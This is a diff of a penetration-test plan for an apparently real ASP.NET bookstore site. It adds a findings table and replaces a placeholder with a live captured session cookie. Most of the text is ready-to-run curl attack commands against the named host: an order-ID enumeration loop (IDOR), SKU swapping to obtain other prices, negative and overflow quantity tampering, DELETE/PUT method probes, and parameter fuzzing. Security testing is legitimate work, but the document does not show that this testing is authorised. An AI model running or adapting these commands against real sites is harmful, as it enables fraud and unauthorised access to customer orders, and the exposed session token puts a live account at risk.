@@ -3,7 +3,34 @@
 **Prepared by:** FraterIT Enterprises
 
 > **Prerequisites:** Burp Suite running on `127.0.0.1:8080`. All `curl` commands route through Burp so every request is captured in HTTP History.
-> Replace `YOUR_SESSION_COOKIE` with the actual `ASP.NET_SessionId` value captured from your browser after adding an item to the cart.
+
+## Confirmed Pre-Test Findings (from HTTP History #174)
+
+These are already documentable **before running any active tests**:
+
+| Severity | Finding | Evidence |
+|---|---|---|
+| **Medium** | IIS version disclosed | `Server: Microsoft-IIS/10.0` in every response |
+| **Medium** | ASP.NET version disclosed | `X-AspNet-Version: 4.0.30319` — released ~2010, EOL |
+| **Medium** | Technology stack exposed | `X-Powered-By: ASP.NET` |
+| **Medium** | Code last updated 2013 | `//iHorse added on 15-Mar-2013` in response JS |
+| **Info** | Deprecated P3P header | `P3P: CP="CAO PSA OUR"` — no modern CSP present |
+| **Info** | 302 redirect returns 146KB body | Full HTML page rendered before redirect fires |
+| **High** | ViewState present — MAC status unknown | Large Base64 blob in POST body (see A08 test) |
+
+**Session cookie captured from Burp (replace with your live value each session):**
+```
+ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh
+```
+
+**Confirmed POST body field names (from Repeater):**
+```
+__EVENTTARGET=
+__EVENTARGUMENT=
+__LASTFOCUS=
+__VIEWSTATE=<large Base64 blob>
+```
+Copy the full `__VIEWSTATE` value from Burp Repeater → Raw tab before running the curl commands below.
 
 ---
 
@@ -78,7 +105,7 @@ cat /tmp/ffuf_paths.json | python3 -m json.tool | grep -E '"url"|"status"'
 for order_id in $(seq 990 1010); do
   status=$(curl -sk -o /dev/null -w "%{http_code}" \
     -x http://127.0.0.1:8080 \
-    -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+    -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
     "https://webservices.advanceware.net/gironbooksb2c/OrderDetail.aspx?OrderID=${order_id}")
   echo "OrderID ${order_id}: HTTP ${status}"
 done
@@ -105,30 +132,30 @@ ffuf -u "https://webservices.advanceware.net/gironbooksb2c/OrderDetail.aspx?Orde
 
 **Goal:** Replace the cart item SKU with another product SKU to get unauthorized pricing or access restricted items.
 
+**In Burp Repeater (already open from #174):**
+1. The POST body is loaded — find the SKU field (search for `9789501709421`)
+2. Change the value to an adjacent SKU: `9789501709422`, `9789501709420`
+3. Click **Send** — compare response size and price in the response
+
 ```bash
-# Step 1: Capture the ViewState from the cart page
-curl -sk -x http://127.0.0.1:8080 \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
-  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
-  -o /tmp/cart.html
+# CLI version — paste your ViewState from Burp Repeater Raw tab into VIEWSTATE_VALUE
+# Current known SKU: 9789501709421 ("Companero y sus misterios")
 
-# Extract ViewState value
-grep -oP '__VIEWSTATE[^>]*value="[^"]*"' /tmp/cart.html | head -5
-
-# Step 2: Submit cart with a different SKU (swap out 9789501709421)
-# Replace VIEWSTATE_VALUE with extracted value
 curl -sk -x http://127.0.0.1:8080 \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   -X POST \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
-  -d "__VIEWSTATE=VIEWSTATE_VALUE" \
-  -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
-  -d "txtSKU=9789501709422" \
-  -d "txtQty=1" \
-  -d "btnRecalculate=Recalculate" \
+  --data-urlencode "__EVENTTARGET=" \
+  --data-urlencode "__EVENTARGUMENT=" \
+  --data-urlencode "__LASTFOCUS=" \
+  --data-urlencode "__VIEWSTATE=VIEWSTATE_VALUE" \
+  --data-urlencode "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
+  --data-urlencode "txtSKU=9789501709422" \
+  --data-urlencode "txtQty=1" \
+  -d "ctl00%24ContentPlaceHolder1%24btnRecalculate=Recalculate" \
   -o /tmp/cart_sku_swap.html
 
-grep -i "price\|error\|invalid\|total" /tmp/cart_sku_swap.html | head -20
+grep -i "price\|error\|invalid\|total\|11.95\|0.00" /tmp/cart_sku_swap.html | head -20
 ```
 
 ---
@@ -140,37 +167,37 @@ grep -i "price\|error\|invalid\|total" /tmp/cart_sku_swap.html | head -20
 ```bash
 # Negative quantity
 curl -sk -x http://127.0.0.1:8080 \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   -X POST \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
   -d "__VIEWSTATE=VIEWSTATE_VALUE" \
   -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
   -d "txtQty=-1" \
-  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
+  -d "ctl00%24ContentPlaceHolder1%24btnRecalculate=Recalculate" \
   -o /tmp/cart_neg_qty.html
 grep -i "total\|price\|error" /tmp/cart_neg_qty.html | head -10
 
 # Zero quantity
 curl -sk -x http://127.0.0.1:8080 \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   -X POST \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
   -d "__VIEWSTATE=VIEWSTATE_VALUE" \
   -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
   -d "txtQty=0" \
-  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
+  -d "ctl00%24ContentPlaceHolder1%24btnRecalculate=Recalculate" \
   -o /tmp/cart_zero_qty.html
 grep -i "total\|price\|error" /tmp/cart_zero_qty.html | head -10
 
 # Very large quantity (integer overflow attempt)
 curl -sk -x http://127.0.0.1:8080 \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   -X POST \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
   -d "__VIEWSTATE=VIEWSTATE_VALUE" \
   -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
   -d "txtQty=99999999" \
-  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
+  -d "ctl00%24ContentPlaceHolder1%24btnRecalculate=Recalculate" \
   -o /tmp/cart_big_qty.html
 grep -i "total\|price\|error\|overflow" /tmp/cart_big_qty.html | head -10
 ```
@@ -258,14 +285,14 @@ grep -i "9789501709421\|CompaneroMisterios\|total\|item" /tmp/cart_hijack.html |
 # Test DELETE on the cart endpoint
 curl -sk -x http://127.0.0.1:8080 \
   -X DELETE \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
   -v 2>&1 | grep -E "HTTP|Allow|Location"
 
 # Test PUT
 curl -sk -x http://127.0.0.1:8080 \
   -X PUT \
-  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+  -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
   "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
   -v 2>&1 | grep -E "HTTP|Allow|Location"
 
@@ -287,7 +314,7 @@ curl -sk -x http://127.0.0.1:8080 \
 for val in "No" "True" "False" "1" "0" "admin" "all" "null" "undefined"; do
   status=$(curl -sk -o /dev/null -w "%{http_code}" \
     -x http://127.0.0.1:8080 \
-    -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
+    -b "ASP.NET_SessionId=y3u3l2tsaw2fyaj0lnykd5yh" \
     "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=${val}")
   echo "Recalc=${val} → HTTP ${status}"
 done
